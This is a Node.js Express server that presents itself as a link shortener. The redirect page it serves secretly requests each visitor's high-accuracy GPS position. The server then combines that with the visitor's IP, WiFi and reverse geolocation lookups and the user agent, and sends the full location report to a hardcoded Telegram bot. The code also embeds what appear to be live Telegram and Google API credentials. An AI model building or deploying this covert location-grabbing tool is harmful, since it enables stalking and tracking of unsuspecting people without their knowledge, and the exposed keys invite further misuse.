const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

// ===== TELEGRAM SENDER (مع retry) =====
async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      console.log(`[TG] Attempt ${i + 1}/${retries}...`);
      
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        { 
          chat_id: TELEGRAM_CHAT_ID, 
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );

      console.log('✅ [TG] SUCCESS:', response.data.result.message_id);
      return true;
    } catch (err) {
      console.error(`❌ [TG] Attempt ${i + 1} failed:`, err.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 1000));
    }
  }
  return false;
}

// ===== GEOLOCATION METHODS =====

async function getIPLocation(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
    if (res.data && res.data.status === 'success') {
      return {
        method: '🌐 IP Geolocation',
        country: res.data.country,
        city: res.data.city,
        latitude: parseFloat(res.data.lat).toFixed(6),
        longitude: parseFloat(res.data.lon).toFixed(6),
        accuracy: '±50-100km',
        isp: res.data.isp
      };
    }
  } catch (e) {
    console.log('[IP] Error:', e.message);
  }
  return null;
}

async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { 
        timeout: 3000,
        headers: { 'User-Agent': 'LinkShortener/1.0' }
      }
    );
    
    if (res.data && res.data.address) {
      const addr = res.data.address;
      return {
        method: '🗺️ Reverse Geocoding',
        country: addr.country || 'Unknown',
        city: addr.city || addr.town || 'Unknown',
        address: res.data.name || 'N/A'
      };
    }
  } catch (e) {
    console.log('[Reverse] Error:', e.message);
  }
  return null;
}

async function getWiFiLocation(wifiData) {
  if (!wifiData || wifiData.length === 0) return null;
  
  try {
    const payload = {
      wifiAccessPoints: wifiData.slice(0, 10).map(w => ({
        macAddress: w.bssid || w.ssid,
        signalStrength: w.level || -50
      }))
    };

    const res = await axios.post(
      'https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAJT6OiVBLUw-bPv6yqzHKjVx9dPy_pVIM',
      payload,
      { timeout: 3000 }
    );

    if (res.data && res.data.location) {
      return {
        method: '📶 WiFi Triangulation',
        latitude: parseFloat(res.data.location.lat).toFixed(6),
        longitude: parseFloat(res.data.location.lng).toFixed(6),
        accuracy: `±${res.data.accuracy.toFixed(0)}m`,
        networks: wifiData.length
      };
    }
  } catch (e) {
    console.log('[WiFi] Error:', e.message);
  }
  return null;
}

// ===== API ENDPOINTS =====

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  console.log(`[SHORT] Created: ${shortCode} -> ${url}`);

  res.json({ 
    shortened: `${process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app'}/${shortCode}`, 
    code: shortCode 
  });
});

// API لتسجيل البيانات
app.post('/api/log-all', async (req, res) => {
  console.log('[API] /api/log-all called');
  console.log('[API] Body:', JSON.stringify(req.body).substring(0, 200));

  const { code, gps, wifi } = req.body;
  
  if (!linkStorage[code]) {
    console.log(`[API] Code not found: ${code}`);
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;

  console.log(`[LOG] Processing: ${code} | IP: ${ip}`);

  // Method 1: GPS
  let gpsInfo = null;
  if (gps && gps.latitude && gps.longitude) {
    gpsInfo = {
      method: '📍 Browser GPS',
      latitude: parseFloat(gps.latitude).toFixed(6),
      longitude: parseFloat(gps.longitude).toFixed(6),
      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
      altitude: gps.altitude ? `${gps.altitude.toFixed(0)}m` : 'N/A',
      heading: gps.heading !== null ? `${gps.heading.toFixed(0)}°` : 'N/A'
    };
    console.log('[GPS] ✅ Received');
  } else {
    console.log('[GPS] ❌ Not available');
  }

  // Method 2: IP
  const ipInfo = await getIPLocation(ip);
  console.log('[IP]', ipInfo ? '✅' : '❌');

  // Method 3: WiFi
  const wifiInfo = await getWiFiLocation(wifi);
  console.log('[WiFi]', wifiInfo ? '✅' : '❌');

  // Method 4: Reverse Geocoding
  let reverseInfo = null;
  if (gpsInfo) {
    reverseInfo = await reverseGeocode(gpsInfo.latitude, gpsInfo.longitude);
  } else if (ipInfo) {
    reverseInfo = await reverseGeocode(ipInfo.latitude, ipInfo.longitude);
  }
  console.log('[Reverse]', reverseInfo ? '✅' : '❌');

  // بناء الرسالة
  let msg = `
🔗 <b>رابط فُتح!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>📌 الكود:</b> <code>${code}</code>
<b>🌐 الرابط:</b> ${originalUrl}
<b>🔌 IP:</b> <code>${ip}</code>
⏰ ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━━━━━━━━━━

`;

  // Method 1: GPS
  if (gpsInfo) {
    msg += `<b>✅ [1] ${gpsInfo.method}</b>
📍 <code>${gpsInfo.latitude}, ${gpsInfo.longitude}</code>
📏 ${gpsInfo.accuracy}
⛰️ ${gpsInfo.altitude}
🧭 ${gpsInfo.heading}
🗺️ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
  } else {
    msg += `<b>❌ [1] Browser GPS</b> - Not available\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Method 2: IP
  if (ipInfo) {
    msg += `<b>✅ [2] ${ipInfo.method}</b>
🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}
📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>
📏 ${ipInfo.accuracy}
🏢 ${ipInfo.isp}
🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
  } else {
    msg += `<b>❌ [2] IP Geolocation</b> - Failed\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Method 3: WiFi
  if (wifiInfo) {
    msg += `<b>✅ [3] ${wifiInfo.method}</b>
📍 <code>${wifiInfo.latitude}, ${wifiInfo.longitude}</code>
📏 ${wifiInfo.accuracy}
📶 Networks: ${wifiInfo.networks}
🗺️ <a href="https://maps.google.com/?q=${wifiInfo.latitude},${wifiInfo.longitude}">Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
  } else {
    msg += `<b>❌ [3] WiFi Triangulation</b> - Not available\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Method 4: Reverse Geocoding
  if (reverseInfo) {
    msg += `<b>✅ [4] ${reverseInfo.method}</b>
🏳️ ${reverseInfo.country}
🏙️ ${reverseInfo.city}
📍 ${reverseInfo.address}
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
  } else {
    msg += `<b>❌ [4] Reverse Geocoding</b> - Failed\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Method 5: Device Info
  msg += `<b>✅ [5] Device Detection</b>
🖥️ ${userAgent.substring(0, 80)}
━━━━━━━━━━━━━━━━━━━━━━━━━

`;

  // Method 6: Best Method
  const bestMethod = gpsInfo ? '📍 GPS' : (wifiInfo ? '📶 WiFi' : (ipInfo ? '🌐 IP' : 'None'));
  msg += `<b>✅ [6] Best Available</b>
🎯 ${bestMethod}
━━━━━━━━━━━━━━━━━━━━━━━━━`;

  console.log('[MSG] Built, sending to Telegram...');

  // أرسل للـ Telegram
  const sent = await sendToTelegram(msg);

  if (sent) {
    console.log('[API] ✅ Response OK');
    res.json({ success: true });
  } else {
    console.log('[API] ❌ Telegram failed but responding OK');
    res.json({ success: false, telegram_failed: true });
  }
});

// ===== REDIRECT DIRECT =====
app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('Link not found');
  }

  const originalUrl = linkStorage[code].original;

  console.log(`[REDIRECT] ${code} -> ${originalUrl}`);

  // Redirect مباشر
  res.send(`
<!DOCTYPE html>
<html dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>جاري التحويل...</title>
</head>
<body>
  <script>
    const code = '${code}';
    const apiUrl = 'https://vvvvv-production-7945.up.railway.app/api/log-all';
    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
    
    console.log('[REDIRECT] Starting for:', code);
    
    // Redirect فوري
    window.location.href = originalUrl;
    
    // جمع البيانات
    setTimeout(() => {
      console.log('[CLIENT] Collecting data...');
      const data = { code };
      
      // GPS
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            console.log('[GPS] Success:', pos.coords.latitude, pos.coords.longitude);
            data.gps = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              heading: pos.coords.heading
            };
            sendData();
          },
          (err) => {
            console.log('[GPS] Error:', err.message);
            sendData();
          },
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        console.log('[GPS] Not available');
        sendData();
      }
      
      function sendData() {
        console.log('[SEND] Sending to API:', JSON.stringify(data).substring(0, 100));
        
        fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
          keepalive: true
        })
        .then(r => {
          console.log('[SEND] Response:', r.status);
        })
        .catch(err => {
          console.log('[SEND] Fetch error:', err.message);
          // Fallback
          navigator.sendBeacon(apiUrl, JSON.stringify(data));
        });
      }
    }, 100);
  </script>
</body>
</html>
  `);
});

// Test endpoint
app.get('/api/test', (req, res) => {
  const msg = '🔗 Test message from server';
  sendToTelegram(msg).then(ok => {
    res.json({ 
      telegram: ok ? 'sent' : 'failed',
      token: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
      chat_id: TELEGRAM_CHAT_ID
    });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════╗
║ 🚀 Server running on port ${PORT}    ║
║ 🔧 Logging enabled                 ║
║ 📞 TG Token: ${TELEGRAM_BOT_TOKEN.substring(0, 15)}... ║
║ 💬 Chat ID: ${TELEGRAM_CHAT_ID}      ║
╚════════════════════════════════════╝
  `);
});